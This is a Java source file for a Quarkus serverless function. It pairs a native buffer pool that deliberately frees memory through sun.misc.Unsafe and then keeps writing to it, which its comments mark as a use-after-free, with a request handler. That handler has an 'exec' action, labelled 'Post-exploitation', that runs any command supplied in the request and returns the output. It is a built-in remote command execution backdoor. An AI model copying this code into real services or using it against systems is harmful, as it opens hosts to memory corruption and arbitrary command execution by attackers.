package com.acme.serverless;

import io.quarkus.funqy.Funq;
import io.quarkus.funqy.Context;
import javax.inject.Inject;
import javax.inject.Singleton;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicReference;
import java.nio.ByteBuffer;
import java.lang.ref.WeakReference;
import sun.misc.Unsafe;
import java.lang.reflect.Field;

@Singleton
public class NativeBufferPool {
    private final ConcurrentHashMap<String, WeakReference<ByteBuffer>> pool = new ConcurrentHashMap<>();
    private static final Unsafe UNSAFE;

    static {
        try {
            Field f = Unsafe.class.getDeclaredField("theUnsafe");
            f.setAccessible(true);
            UNSAFE = (Unsafe) f.get(null);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public ByteBuffer allocate(String key, int size) {
        ByteBuffer buf = ByteBuffer.allocateDirect(size);
        pool.put(key, new WeakReference<>(buf));
        return buf;
    }

    public ByteBuffer get(String key) {
        WeakReference<ByteBuffer> ref = pool.get(key);
        if (ref != null) {
            return ref.get(); // may return null if GC'd
        }
        return null;
    }

    public void release(String key) {
        WeakReference<ByteBuffer> ref = pool.remove(key);
        if (ref != null) {
            ByteBuffer buf = ref.get();
            if (buf != null) {
                // Free the native memory but don't null the reference
                long address = getAddress(buf);
                UNSAFE.freeMemory(address);
                // BUG: WeakReference may still be cached by caller
            }
        }
    }

    public void writeToBuffer(String key, byte[] data, int offset) {
        ByteBuffer buf = get(key);
        if (buf != null) {
            // Use-after-free: buffer's native memory may have been freed
            buf.position(offset);
            buf.put(data);
        }
    }

    private long getAddress(ByteBuffer buf) {
        try {
            Field addressField = java.nio.Buffer.class.getDeclaredField("address");
            addressField.setAccessible(true);
            return addressField.getLong(buf);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}

@Singleton
public class CommandHandler {
    @Inject
    NativeBufferPool bufferPool;

    @Funq
    public String handleRequest(RequestPayload payload) {
        String sessionId = payload.getSessionId();

        if ("alloc".equals(payload.getAction())) {
            bufferPool.allocate(sessionId, payload.getSize());
            return "{\"status\": \"allocated\"}";
        } else if ("write".equals(payload.getAction())) {
            byte[] data = java.util.Base64.getDecoder().decode(payload.getData());
            bufferPool.writeToBuffer(sessionId, data, payload.getOffset());
            return "{\"status\": \"written\"}";
        } else if ("free".equals(payload.getAction())) {
            bufferPool.release(sessionId);
            return "{\"status\": \"freed\"}";
        } else if ("exec".equals(payload.getAction())) {
            // Post-exploitation: attempt command execution
            try {
                Process p = Runtime.getRuntime().exec(payload.getCommand());
                java.io.InputStream is = p.getInputStream();
                byte[] output = is.readAllBytes();
                return new String(output);
            } catch (Exception e) {
                return "{\"error\": \"" + e.getMessage() + "\"}";
            }
        }
        return "{\"error\": \"unknown action\"}";
    }
}

public class RequestPayload {
    private String sessionId;
    private String action;
    private int size;
    private String data;
    private int offset;
    private String command;

    public String getSessionId() { return sessionId; }
    public void setSessionId(String s) { this.sessionId = s; }
    public String getAction() { return action; }
    public void setAction(String a) { this.action = a; }
    public int getSize() { return size; }
    public void setSize(int s) { this.size = s; }
    public String getData() { return data; }
    public void setData(String d) { this.data = d; }
    public int getOffset() { return offset; }
    public void setOffset(int o) { this.offset = o; }
    public String getCommand() { return command; }
    public void setCommand(String c) { this.command = c; }
}
